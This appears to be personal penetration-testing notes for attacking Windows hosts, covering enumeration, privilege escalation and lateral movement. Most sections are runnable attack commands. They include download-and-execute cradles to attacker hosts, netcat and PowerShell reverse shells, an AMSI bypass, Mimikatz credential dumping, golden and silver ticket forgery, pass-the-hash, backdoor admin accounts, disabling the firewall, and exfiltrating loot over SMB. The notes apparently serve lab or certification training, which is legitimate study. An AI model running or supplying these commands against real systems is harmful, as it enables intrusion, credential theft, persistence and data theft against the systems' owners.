
# Enumeration
Several key pieces of information we should obtain:
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```
### Well-known SIDs
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```


---

# Windows
- If we only have a bind shell (no GUI), we can use `Evil-winRM` to log in as a different user once we have the other user's credentials
### Printing Flags
```PowerShell
# Use below with impacket-winrm because winrm only shows last command
cmd /c "ipconfig /all & echo. & hostname & echo. & whoami & echo. & type local.txt"
# PowerShell
ipconfig /all ; hostname ; whoami ; type proof.txt
```
### Basic Enumeration
```PowerShell
whoami
whoami /groups # group memberships
whoami /priv   # privileges and tokens
Get-LocalUser  # local users
Get-LocalGroup # local groups
Get-LocalGroupMember # members of a group; commonly: Administrators, Remote Desktop Users, Backup Operators, Remote Management Users

Environment variables
set # Command prompt
Get-ChildItem Env: # PowerShell (Note the colon at the end)

hostname
systeminfo # OS, version, and architecture

# Check for active sessions
Get-PSSession

# Enumerate network information
ipconfig /all # check for other network interfaces
route print   # routing table, check for new routes
netstat -ano  # list all active network connections (-a for all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, -o to show process ID for each connection)

Get-ChildItem -Path 'C:\$Recycle.Bin' -Force # Enumerate Recycle Bin
Copy-Item -Path 'C:\$Recycle.Bin\<SID>\<filename>' -Destination "C:\RecoveredFiles\" # Recover files from Recycle Bin

# Check for PuTTY sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

smbclient //192.168.147.122/SYSVOL -U "HARRY.EXAMPLE\fmcsorley%DeerLizardOrca213"

smbmap -u maildmz -p password123 -d boringcomp.com -H 192.168.153.191 -x "whoami"
```

```PowerShell
# Get human-readable sizes of all directories in cwd
# The intention is to spot non-empty directories quickly.
# Note: this script rounds up sizes, so that tiny files in subdirectories are obvious
Get-ChildItem -Directory | ForEach-Object { "{0,-30} {1,10:N2} MB" -f $_.Name, ([Math]::Ceiling(((Get-ChildItem -Recurse -Force -File -ErrorAction SilentlyContinue -Path $_.FullName | Measure-Object Length -Sum).Sum / 1MB * 100)) / 100) }

# Or simply
tree /f .
```
---
### Kali Listener
```bash
sudo rlwrap -cAr nc -lvnp 443
```
- Don't forget to nest the reverse shell to avoid accidents
### Basic Commands
```PowerShell
# PowerShell execution bypass (new session)
powershell -ep bypass
# PowerShell execution bypass (current session)
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
# Must be local admin. Enables WinRM
Enable-PSRemoting -Force

# Add user
net user newuser password123 /add
# Add user to group
net localgroup Administrators user1 /add
# Runas, requires GUI
runas /user:backupadmin cmd
# Runas, elevated admin powershell window
runas /user:dave3 "powershell -NoProfile -ExecutionPolicy Bypass -Command Start-Process powershell -Verb RunAs"

# Downloading (cmd.exe)
bitsadmin /transfer myDownloadJob /download /priority normal http://example.com/file.exe C:\Users\Public\file.exe
# certutil
certutil.exe -urlcache -f http://10.0.0.5/rev.exe rev.exe
curl -o file.exe http://example.com/file.exe
certreq -submit -config http://example.com/file.exe

# Downloading (PowerShell)
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
irm "http://example.com/file.exe" -OutFile "file.exe"
# Download and run in memory (bypass UAC)
IEX (New-Object Net.WebClient).DownloadString('http://example.com/mimikatz.ps1')
Start-BitsTransfer -Source "http://example.com/file.exe" -Destination "file.exe"
# Download and run in memory, preferred
powershell -executionpolicy bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malicious.ps1')"

cmd /c GodPotato-NET4.exe -cmd "cmd /c C:\Users\Public\Documents\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.233 443"
```
### RunasCs
```PowerShell
# --bypass-uac is not always necessary but occasionally helps out
.\RunasCs.exe zach "zachpassword123" "C:\Users\Public\nc64.exe 192.168.45.193 53 -e powershell" --bypas
s-uac
```
### Change Local Admin Password
```PowerShell
$Password = ConvertTo-SecureString "password123" -AsPlainText -Force
Set-LocalUser -Name "Administrator" -Password $Password
# Check if "Administrator" is enabled
(Get-LocalUser -Name "Administrator").Enabled
# Enable "Administrator" if necessary
Enable-LocalUser -Name "Administrator"
```
### Establish User Backdoor Persistence
```PowerShell
net user /add backdoor Password123
net localgroup Administrators /add backdoor
```
### Enable RDP with PowerShell
```PowerShell
# Add user to RDP group
net localgroup "Remote Desktop Users" CORP\john.doe /add 
# Enable RDP
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
# Permit RDP through Windows Firewall
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# ALTERNATIVELY with cmd.exe, enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
# ALTERNATIVELY with cmd.exe,  disable the Windows Firewall completely
netsh advfirewall set allprofiles state off
```
### PowerCat Run In-Memory
```PowerShell
# Example loading Powercat.ps1 directly into memory; run with `powercat --version`
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/powercat.ps1'); powercat -c <attacker-ip> -p <attacker-port> -e cmd"

IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.159/powercat.ps1')
```
### Windows Transferring Files with Base64
```PowerShell
certutil -encode test.exe test.txt
certutil -decode test.txt test.exe
```
### Exfiltration via PowerShell Web Server
```PowerShell
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://*:8080/")
$listener.Start()
Write-Host "HTTP server running on http://localhost:8080/"

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response

    $localPath = Join-Path (Get-Location) $request.Url.LocalPath.TrimStart('/')
    if (-Not (Test-Path $localPath)) {
        $response.StatusCode = 404
        $response.OutputStream.Close()
        continue
    }

    $content = [System.IO.File]::ReadAllBytes($localPath)
    $response.ContentLength64 = $content.Length
    $response.OutputStream.Write($content, 0, $content.Length)
    $response.OutputStream.Close()
}

$listener.Stop()
```
### PowerShell SMB Exfiltration
Start Kali SMB server
```bash
impacket-smbserver share . -smb2support -user kali -password kali
```
```PowerShell
net use \\<kali_ip>\share /user:kali kali
cp loot \\<kali_ip>\share\
net use \\<kali_ip>\share /delete # Optional: Delete share use
```

### Payload Transfers via Windows Pivot
```PowerShell
net share # View shares
net share public=C:\Users\Public /GRANT:Everyone,FULL # Start share from PUBLIC folder named "public"
```
---
### Tokens/Privileges
| Token/Privilege            | Explanation                                                                                                                                                     |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `SeImpersonatePrivilege`   | Potato exploits (especially when compromising IIS or any other service account)                                                                                 |
| `SeDebugPrivilege`         | Mimikatz                                                                                                                                                        |
| `SeAssignPrimaryPrivilege` | Similar to `SeImpersonatePrivilege`. Try Potato exploits                                                                                                        |
| `SeBackupPrivilege`        | Grants **read** access to all objects. Get SAM/SYSTEM                                                                                                           |
| `SeRestorePrivilege`       | Grants **write** access to all objects. Try:<br>	- Modifying service binaries<br>	- Overwriting DLLs used by SYSTEM processes<br>	- Modifying registry settings |
| `SeTakeOwnershipPrivilege` | Lets user take ownership over an object. Once you own an object, you can try the same methods as listed above for `SeRestorePrivilege`                          |
| `SeTcbPrivilege`           |                                                                                                                                                                 |
| `SeCreateTokenPrivilege`   |                                                                                                                                                                 |
| `SeLoadDriverPrivilege`    |                                                                                                                                                                 |
| `SeManageVolumePrivilege`  | https://github.com/CsEnox/SeManageVolumeExploit                                                                                                                 |


---
### Enumerate Applications & Processes
```PowerShell
# List 32-bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
# List 64-bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
*Note: remove `select displayname` to see ALL properties*
> *Note: this may not be a complete list due to an incomplete or failed installation process. Therefore, we should always check both 32-bit and 64-bit **`Program Files`** directories.*
### Enumerate Processes, Interesting Files, History
```PowerShell
dir /s/b *.pdf

Get-Process # Use in conjunction with `netstat -ano` to correlate processes to network traffic

# Searching for password manager databases on C:\ drive
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# Searching for sensitive information in XAMPP directory
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
# Searching for text files and password manager databases in user home directory
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
# Useful files in user's home directory
Get-ChildItem -Path C:\Users\ -Include *.txt,*.settings,*.ini,*.log,*.kdbx,*.xml,*.config,*.doc,*.docx,*.pdf,*.xls,*.xlsx,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
# Useful files everywhere (lots of noise)
Get-ChildItem -Path C:\ -Include *.kdbx,*.ini,*.txt -File -Recurse -ErrorAction SilentlyContinue

Get-History
(Get-PSReadlineOption).HistorySavePath # (a secondary PS history log)

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Transcript file locations default
dir C:\Users\Public\Transcripts

```
```PowerShell
# Generally interesting; some of the files below may be base64 encoded
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
- Check for Script Block Logging in Event Viewer (`EventCode = 4104`)
---
### Credentials
```PowerShell
cmdkey /list # cached creds
(Get-Acl "C:\Windows\System32\config\SAM").Access # check SAM & SYSTEM readable
# Search registry for "password"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
# Recursively search for files in the current directory that contain the word `password` and also end in either `.xml`, `.ini`, or `.txt`
findstr /si password *.xml *.ini *.txt
```
---
### Scheduled Tasks
***Remember you will not be able to see higher privileged Scheduled Tasks***
```PowerShell
schtasks /query /fo LIST /v # Huge amount of output. Copy to schtask.txt and run command below
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM # SYSTEM can be changed to another privileged user

# List all scheduled tasks YOUR USER can see (cannot see higher priv'd)
Get-ScheduledTask | where {$_.TaskPath -notLike "\Microsoft*"} | ft TaskName,TaskPath,State
```

ChatGPT script to search for scheduled tasks authored by or run by a specific user (**`roy`** in this example). Or, check to see if any of these scheduled tasks trigger scripts or executables located in `C:\Users` directory:
```PowerShell
$username = "roy" # CHANGE ME
$userDirectory = "C:\\Users\\"

$tasks = schtasks /query /fo LIST /v | Out-String
$tasksArray = $tasks -split "(?m)^\s*$"  # Split tasks by empty lines

$filteredTasks = @()

foreach ($task in $tasksArray) {
    if ($task -match "Author:\s+" + [regex]::Escape($username) -or 
        $task -match "Run As User:\s+" + [regex]::Escape($username) -or 
        $task -match "Task To Run:\s+" + [regex]::Escape($userDirectory)) {
        $filteredTasks += $task.Trim()
    }
}

# Output the filtered tasks
$filteredTasks | Out-Host
```
---
## Services
### Enumerate Running Services (don't forget to enumerate ALL)
```PowerShell
# PowerUp.ps1 (services that can be modified)
Get-ModifiableServiceFile # View the recommended action in "AbuseFunction"
Install-ServiceBinary -Name 'mysql'

# Look for services NOT in C:\Windows\
Get-CimInstance -ClassName win32_service | Select Name,StartName,State,PathName | Where-Object {$_.State -like 'Running'}

# Goated technique for enumerating unquoted service paths
# Must be run with cmd.exe
wmic service get name,pathname | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
# Follow-up with "sc.exe qc <name>" and "sc.exe query <name>" below
```
### `icacls` to check permissions for service binary

| **Mask** | **Permission**          |
| -------- | ----------------------- |
| F        | Full access             |
| M        | Modify access           |
| RX       | Read and execute access |
| R        | Read-only access        |
| W        | Write-only access       |
```PowerShell
icacls "C:\xampp\apache\bin\httpd.exe" # basic icacls

# Check service auto-start on reboot
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.StartMode -like 'Auto'}

# Get service event logs
Get-WinEvent -LogName System -MaxEvents 50 | Where-Object { $_.ProviderName -eq "Service Control Manager" -and $_.Message -match "BackupMonitor" }

# Restart service
Restart-Service -Name BackupMonitor -Force

winPEASany.exe quiet servicesinfo # winPEAS service misconfigurations scan
# Check what DLLs a running service is currently using
(Get-Process notepad).Modules | Select-Object ModuleName, FileName
sc.exe qc <name> # Query the configuration of a service (check for DLL hijacking opportunity)
sc.exe query <name> # Query the current status of a service
Get-Service -Name <name> | Format-List * # Check service status
sc.exe config <name> <option>= <value> # Modify a configuration option of a service
sc.exe config BackupMonitor depend= Tcpip # Make Tcpip stack a dependency
# EXAMPLE (changing binpath):
sc.exe config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""

sc.exe start/stop <name> # Start/stop a service
net start/stop <name> # Start/stop a service

# Get ID then attempt to stop the service
Get-WmiObject Win32_Service | Where-Object { $_.Name -eq "EnterpriseService" } | Select-Object Name, ProcessId # Get ID
Stop-Process -Id <ProcessID> -Force # Stop the service

Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List # Check registry ACL; if weak, use following command
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f # Overwrites ImagePath registry key to point to our RevShell executable

```

Consider adding `sc config BackupMonitor depend= Tcpip` so that the TCP/IP stack in Windows is a service dependency; i.e., that TCP/IP is up before trying to launch a reverse shell

---
### PowerUp
```PowerShell
# Quick full check
Invoke-AllChecks

# Vulnerable services
#Get-ServiceUnquoted
#Get-ServiceFilePermission # services we have write permissions on binary
#Get-ServicePermission # service we can modify (config, start/stop, etc.)

# DLL Hijacking candidates
#Get-PathHijackable # directories in path that we can write to
Get-ModifiablePath # modifiable directories in ENV variables
Get-ModifiableServiceFile

# Credential Hunting
# Get-RegAutoLogon
Get-UnattendedInstallFile # Unattended install files
Get-WebConfig # looks for connection strings in web.config files

# Registry / AutoRuns
#Get-RegAlwaysInstallElevated
Get-ApplicationHost # looks for credentials in applicationHost.config

# Exploitation Helpers
# Abuse unquoted service path
Invoke-ServiceAbuse -Name "VulnService" -Command "C:\Temp\shell.exe"
# DLL hijack template
#Invoke-ProcessDLLHijack -Command "C:\Temp\shell.exe" -DLL "evil.dll" # Command is the target executable that is vulnerable; DLL is DLL that is vulnerable
```
### Kernel Exploits
```PowerShell
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" } # Enumerate security updates

systeminfo
```


---
### WinPEAS
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
```
Color Legend:
```
Red:         Indicates a special privilege over an object or something is misconfigured
Green:       Indicates that some protection is enabled or something is well configured
Cyan:        Indicates active users
Blue:        Indicates disabled users
LightYellow: Indicates links
```
Lists in order:
- System information
- Transcript file locations
- Users/groups
- Processes, services, and scheduled tasks, network information, and installed applications
- `Looking for possible password files in users homes`

Fix for broken terminal colors (run and then open new powershell):
``` PowerShell
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

---
### Seatbelt
Get pre-compiled binary from `https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe`. Run with option `-group=all`

---
### RDP
```PowerShell
xfreerdp /u:leon /p:"HomeTaping199\!" /d:corp.com /v:192.168.211.74 /dynamic-resolution /cert:ignore +clipboard +drive:SHARED,.
```
```bash
# Enable RDP remotely
netexec smb $IP -u username -p pass -M rdp -o ACTION=enable
```
See [[Windows V2#Pass-The-Hash]] for RDP pass-the-hash

---
# Windows PrivEsc
### Mimikatz
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```
```PowerShell
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /inject" "exit"
```
```PowerShell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "exit"

sekurlsa::logonpasswords # SeDebugPrivilege required
lsadump::sam # Only SeBackupPrivilege is required
lsadump::ntds # Domain users
lsadump::secrets
lsadump::cache
lsadump::lsa /inject # LSA process; only SeDebugPrivilege is required
```
- If Mimikatz is being blocked by Windows security, can try [[Windows V2#Evil-WinRM]] evil-winRM's `Bypass-4MSI`
- See [[Windows V2#Basic Commands]] for how to bypass UAC

```PowerShell
privilege::debug # elevate privileges (SeDebugPrivilege)
token::elevate # bypass UAC by elevating token (SeImpersonatePrivilege)
log mimi.log # Start logging session
misc::cmd # Launches a new cmd.exe under the current security context

# Dumping Credentials
sekurlsa::logonpasswords # Extracts plaintext password and password hashes from all available sources (lsadump::sam will generate cleaner output)
lsadump::sam # extract user password hashes from SAM
lsadump::lsa /patch # Cached secrets and credentials. Dumps LSA secrets (service passwords). Patches LSA to bypass some protections. Will not defeat Windows Credential guard.
sekurlsa::msv # Retrieves NTLM hashes for active users (pass-the-hash)
lsadump::secrets # Dump LSA secrets
misc::memssp # Defeat Windows Credential Guard (must wait for domain user to login)
sekurlsa::tickets /export # Dump *.kirbi TGS tickets

# Pass-the-hash
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:powershell.exe

# Pass-the-ticket
kerberos::list
kerberos::purge # CAUTION: Clear tickets
kerberos::ptt ticket.kirbi # Inject a Kerberos ticket
# Golden ticket (forge TGT)
kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1393c6cefafafc7af11ef36d1c788f47 /ptt
# Silver Ticket; note "jebadmin" given user can be any existing user in the domain. If this doesn't work, try giving another user that exists in the domain
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:3d28cf1232d39971419580a51484ca09 /user:jebadmin
# Pass-the-hash Silver Ticket (forge TGS)
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:powershell.exe
# DCSync (we must have access to a user that is in at least one of "Domain Admins", "Enterprise Admins", or "Administrators")
# "Administrator" is the user we ant to obtain credentials for
# "impacket-secretsdump" is the equivalent
lsadump::dcsync /user:corp\Administrator
```
- `klist` to validate tickets are now in-memory (thanks to `/ptt` flag)

Common `/service` options in `kerberos::golden`:

| Service Option     | SPN (Service Principal Name) | Purpose                                                   |
| ------------------ | ---------------------------- | --------------------------------------------------------- |
| `/service:krbtgt`  | `krbtgt/<DOMAIN>`            | Default for **Golden Tickets** (domain-wide access)       |
| `/service:cifs`    | `cifs/<SERVER>`              | File sharing and SMB access (lateral movement)            |
| `/service:http`    | `http/<SERVER>`              | Web applications and IIS services                         |
| `/service:ldap`    | `ldap/<SERVER>`              | LDAP directory access (used for AD enumeration)           |
| `/service:rpc`     | `rpc/<SERVER>`               | Remote Procedure Calls (RPC) for remote system management |
| `/service:host`    | `host/<SERVER>`              | Generic host services (used for remote desktop and WMI)   |
| `/service:ftp`     | `ftp/<SERVER>`               | FTP server access                                         |
| `/service:wsman`   | `wsman/<SERVER>`             | Windows Remote Management (WinRM) for PowerShell remoting |
| `/service:mssql`   | `mssql/<SERVER>`             | SQL Server database access                                |
| `/service:termsrv` | `termsrv/<SERVER>`           | Remote Desktop Protocol (RDP) access                      |
| `/service:smb`     | `smb/<SERVER>`               | Alternative to `cifs` for SMB access                      |
| `/service:svc`     | `svc/<SERVER>`               | Custom services running under specific service accounts   |

```PowerShell
powershell -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.195/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug token::elevate lsadump::sam'"
```

```bash
wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1
```

```powershell
Invoke-WebRequest -Uri http://192.168.45.195:80/Invoke-Mimikatz.ps1 -OutFile ./Invoke-Mimikatz.ps1

.\Invoke-Mimikatz.ps1 -Command '"privilege::debug" ;; "token::elevate" ;; "lsadump::sam"'
```

```PowerShell
powershell -ep bypass -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); iex (New-Object Net.WebClient).DownloadString('http://192.168.45.195/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug token::elevate lsadump::sam'"
```

Error: `sekurlsa::logonpasswords kuhl_m_sekurlsa_acquireLSA ; Logon list`
- Try a different version until it works:
	- CONFIRMED GOOD: https://github.com/ebalo55/mimikatz/tree/main/x64
		- Offsec community suggests this
		- This one works with Windows 11
	- Kali Linux version: `/usr/share/windows-resources/mimikatz/`
		- Doesn't work
---
### Potatoes
 > - GodPotato is more reliable but worse experience
 > - SweetPotato is better experience but less reliable
### GodPotato
```PowerShell
GodPotato -cmd "cmd /c whoami" # Simple (consider adding "-usevuln" flag)
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012" # Reverse shell

# Add user to admin group
.\godpotato.exe -cmd "net localgroup Administrators sarah /add"

# Scheduled task (in case reverse shell is failing)
.\godpotato.exe -cmd 'schtasks /create /tn "shell" /tr "C:\Users\Public\rev2.exe" /sc MINUTE /mo 1 /ru "SYSTEM" /F'
```
### SweetPotato
```PowerShell
# https://github.com/carr0t2/SweetPotato (GitHub with build action)
.\SweetPotato.exe -e PrintSpoofer # Default (`PrintSpoofer`)
.\SweetPotato.exe -e EfsRpc # USE THIS ONE
.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd" # USE THIS ONE; with "-e EfsRpc" and "nc.exe"
.\SweetPotato.exe -e WinRM # with -e WinRM
.\SweetPotato.exe -e DCOM  # with -e DCOM
```
---
### Evil-WinRM
Fixes PowerShell no output when running commands. Supports pass the hash, in-memory loading, and file upload/download.
Connect:
```bash
# CAREFUL CONNECTING TO DOMAIN, "corp.com\evil" will not work, needs to just be "corp\"
evil-winrm -i 192.168.50.220 -u "corp\daveadmin" -p "qwertqwertqwert123\!\!" -o evil-winrm-logs.txt

# -S flag can be used for SSL connection
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!" -o evil-winrm-logs.txt

# Pass-the-hash
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -o evil-winrm-logs.txt

# Using a certificate (PKI auth)
evil-winrm -i <TARGET_IP> -c <CERTIFICATE.PFX> -p <PFX_PASSWORD> -o evil-winrm-logs.txt

# Public/private keys
evil-winrm -i <TARGET_IP> -c <CERTIFICATE.PEM> -k <PRIV-KEY.PEM> -S -o evil-winrm-logs.txt
```
Commands:
```PowerShell
# See all commands
menu
# enumerate services
services

# Bypassing Windows security
Bypass-4MSI
# Run binary from attack box
Invoke-Binary /opt/privsc/winPEASx64.exe

upload /path/to/local/file.exe C:\Users\Public\file.exe
download loot.txt
download C:\Users\Public\loot.txt /local/path/loot.txt
# Uploads and executes the script in memory
script /path/to/local/script.ps1
```

---
### Pass-The-Hash
```bash
# https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/

# Fully interactive, but requires admin privileges
# Requires writable SMB shares (typically C$ or ADMIN$)
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.153.212

# Not fully interactive, each command runs separately
# Requires WMI open (validate ports)
# SEE DEDICATED "PASS THE HASH" AD SECTION FOR MORE INFO
impacket-wmiexec -hashes :e78ca771aeb91ea70a6f1bb372c186b6 Administrator@192.168.153.212

# See also Evil-WinRM section
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -l evil-winrm-logs.txt

# Access SMB (file operations on SMB, not command execution)
smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local

# Shaping operation for future RDP use (possible but need to explicitly enable "Restricted Admin Mode")
# (Add "-d corp.com" for domain)
cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

# RDP pass-the-hash
xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
# RDP pass-the-hash domain
xfreerdp /v:192.168.2.200 /u:CORP\Administrator /d:corp.com /pth:8846F7EAEE8FB117AD06BDD830B7586C
```

---
### Payloads
```bash
# Remember Windows Server is always x64
# List payload options
msfvenom -p windows/x64/shell_reverse_tcp --list-options
# Bat
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.45.162 LPORT=443 > shell.bat
# DLL Hijacking
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.111 LPORT=443 -f dll -o hijackme.dll
# Generate base64 encoded PowerShell reverse one-liner ("-w 0" ensures single line)
echo "powershell -nop -ep bypass -e `echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.195",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -f UTF-8 -t UTF-16LE | base64 -w 0`"
```

Custom PowerShell base64 encoded payload:
```PowerShell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.195",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
```

Custom PowerShell base64 encoded payload:
```PowerShell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.195",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

```bash
# Handler / Meterpreter one-liner
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.162;set LPORT 443;run;"
```

---
### MSSQL (Microsoft SQL Server)
```sql
# Connect to MSSQL with Windows creds (port 1433)
impacket-mssqlclient Administrator:Lab123@192.168.170.18 -windows-auth

SQL> SELECT SYSTEM_USER;
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.45.195/shell.ps1'')"';

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

SELECT name FROM sys.databases; # Lists all databases on the server
SELECT name, type_desc, is_disabled FROM sys.server_principals; # Server-level logins
SELECT name FROM master..syslogins; # Contains login names and sometimes password hashes (in older versions)
SELECT name, password_hash FROM sys.sql_logins; # Stores SQL logins, and sometimes encrypted password information

# Database-level logins
USE target_database;
SELECT name, type_desc FROM sys.database_principals;
SELECT name, uid, sid FROM sysusers;
```

ChatGPT script to dump MSSQL:
```sql
-- 1️⃣ Get all server-level logins (who can connect to the SQL Server instance)
SELECT '=== SERVER PRINCIPALS ===' AS output;
SELECT name, type_desc, is_disabled, default_database_name
FROM sys.server_principals;

-- 2️⃣ List all databases on the server
SELECT '=== DATABASES ===' AS output;
SELECT name AS database_name
FROM sys.databases
WHERE state_desc = 'ONLINE';

-- 3️⃣ Build dynamic SQL to loop through each database and extract users and roles
DECLARE @dbName NVARCHAR(128);
DECLARE db_cursor CURSOR FOR
SELECT name FROM sys.databases WHERE state_desc = 'ONLINE';

OPEN db_cursor;
FETCH NEXT FROM db_cursor INTO @dbName;

WHILE @@FETCH_STATUS = 0
BEGIN
    DECLARE @query NVARCHAR(MAX);
    SET @query = '
        USE [' + @dbName + '];
        PRINT ''=== DATABASE PRINCIPALS IN ' + @dbName + ' ==='';
        SELECT name, type_desc, authentication_type_desc, default_schema_name
        FROM sys.database_principals
        WHERE type NOT IN (''A'', ''R'', ''G'') -- Skip application roles, database roles, and groups
        AND name NOT LIKE ''##%'' -- Skip system accounts
        AND name NOT LIKE ''db_%''; -- Skip default roles
    ';
    EXEC sp_executesql @query;
    FETCH NEXT FROM db_cursor INTO @dbName;
END

CLOSE db_cursor;
DEALLOCATE db_cursor;

```

---
### SMB
```PowerShell
# SMB RCE (-X flag)
netexec smb 192.168.50.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
```
